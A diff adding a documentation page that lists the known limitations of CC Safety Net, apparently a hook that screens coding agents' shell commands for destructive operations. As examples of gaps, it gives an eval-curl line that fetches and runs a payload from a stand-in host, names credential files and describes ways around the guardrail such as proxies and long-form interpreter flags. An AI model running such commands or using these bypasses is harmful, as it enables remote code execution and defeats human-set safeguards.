@@ -1,0 +1,74 @@
+---
+title: "CC Safety Net Known Limitations and Pitfalls"
+sidebarTitle: "Known Limitations"
+description: "What CC Safety Net cannot do: transparent command proxies, behavior inside binaries, reads and network, symlink TOCTOU, interpreter long-form flags, attached short-option values, and eval-based execution."
+---
+
+CC Safety Net analyzes the command string your agent attempts to run. It is a strong guardrail against accidental data loss from known-destructive git and filesystem operations, but it is not a complete security solution. This page is an honest list of what it cannot catch, so you can set correct expectations and know when to reach for [sandboxing](/guides/vs-sandboxing) instead.
+
+The project's scope is deliberately focused: **preventing coding agents from making accidental mistakes that cause data loss**. It is not a general attack-prevention or sandboxing system.
+
+## Command-string analysis limits
+
+### Behavior inside binaries
+
+If a command does not visibly contain a destructive operation, command-string analysis cannot infer it. `some-tool --task destructive-cleanup` looks benign to CC Safety Net — it cannot inspect what an arbitrary binary does at runtime. Use [sandboxing](/guides/vs-sandboxing) for that threat class.
+
+### Transparent command proxies
+
+A tool that rewrites or proxies a shell command before it runs (for example `rtk git reset --hard`) can bypass analysis, because CC Safety Net sees the proxy executable (`rtk`) rather than the underlying command. Some top-level proxied commands are caught by a fallback dangerous-text scan, but this is incomplete, and [custom rules](/configuration/custom-rules) do not yet apply through proxies. Work is tracked to add a transparent-proxy normalization layer.
+
+### eval and dynamic execution
+
+Commands that construct and execute code at runtime cannot be fully analyzed, because the executed string is not present in the command text at analysis time:
+
+```bash
+eval "$(curl https://evil.example/payload)"
+bash -c "$(cat destructive.sh)"
+```
+
+CC Safety Net recursively scans `bash -c` and interpreter code arguments, but if the code is fetched from a remote source or assembled from variables, the destructive payload is invisible to command-string analysis. This is a fundamental limit of the approach.
+
+## Parser edge cases
+
+### Interpreter long-form flags
+
+CC Safety Net extracts the code passed to an interpreter's `-c` or `-e` flag (for `python`, `python2`, `python3`, `node`, `ruby`, `perl`) and scans it for embedded destructive operations. The **long-form equivalents** (`--eval`, `--execute`, `--print`, `--require`) and the attached `=value` form (`--eval='code'`) are not recognized in every code path. When the long form is used, the code argument may not be extracted for recursive analysis.
+
+If interpreter bypass is a concern in your environment, enable [paranoid interpreters mode](/configuration/modes#interpreter-one-liners-cc_safety_net_paranoid_interpreters1) (`CC_SAFETY_NET_PARANOID_INTERPRETERS=1`), which blocks all interpreter one-liners outright regardless of content.
+
+### Attached short-option values
+
+Bundled short flags (like `-rf`) are correctly split into `{ -r, -f }`. However, the **attached value form** for short options (for example `-Cfoo` where `foo` is the value of `-C`) is handled inconsistently across analyzers. Blocking a flag like `-f` may produce a false positive when it is actually part of an attached option value like `-Cfoo`.
+
+This is most relevant when writing precise [custom rules](/configuration/custom-rules). When in doubt, use [strict](/configuration/modes#strict-mode-cc_safety_net_strict1) or [paranoid](/configuration/modes#paranoid-mode-cc_safety_net_paranoid1) mode for stronger protection.
+
+### Symlink TOCTOU risk
+
+`rm -rf` target classification resolves symlinks to their canonical targets before deciding whether a path is dangerous. There is an unavoidable **time-of-check-to-time-of-use (TOCTOU)** window between when the analyzer resolves a path and when the shell actually executes the `rm`. A symlink could be repointed in that window.
+
+This is inherent to any pre-execution command analysis tool; fully closing it would require running inside the kernel or intercepting syscalls, which is out of scope for a hook. The [paranoid rm](/configuration/modes#rm-check-cc_safety_net_paranoid_rm1) mode (`CC_SAFETY_NET_PARANOID_RM=1`) provides a stricter stance for operators who want to block more aggressively.
+
+## Out of scope
+
+### Reads and network
+
+CC Safety Net has **no read-protection layer and no network layer**. It does not stop an agent from reading sensitive files (for example `~/.aws/credentials`, `~/.ssh/id_*`, or `.env` files) or exfiltrating data over the network. Those threats are exactly what sandboxing's read constraints and domain-based network filtering address. See [vs Sandboxing — where CC Safety Net cannot help](/guides/vs-sandboxing#where-cc-safety-net-cannot-help).
+
+### General attack prevention
+
+Blocking prompt-injection-driven exfiltration, authenticating users, enforcing container boundaries, and network egress filtering are all out of scope. CC Safety Net assumes the agent's command string is untrusted, but it does not detect hidden behavior inside arbitrary binaries or enforce filesystem boundaries.
+
+## Platform-specific issues
+
+### OpenCode stale cache
+
+OpenCode's plugin installer can keep serving a stale cached version of `cc-safety-net` after a new release is published. If updates do not take effect, clear the cache and reinstall — see the [OpenCode installation steps](/installation#opencode). Run `npx cc-safety-net doctor` to confirm the detected plugin version.
+
+## What to do if a destructive command slipped through
+
+```bash
+npx cc-safety-net explain "<the command>"
+```
+
+The `explain` command shows the full step-by-step analysis of how CC Safety Net evaluated that specific command. If you find a genuine bypass of a documented protection, report it as described in the [security policy](/security).
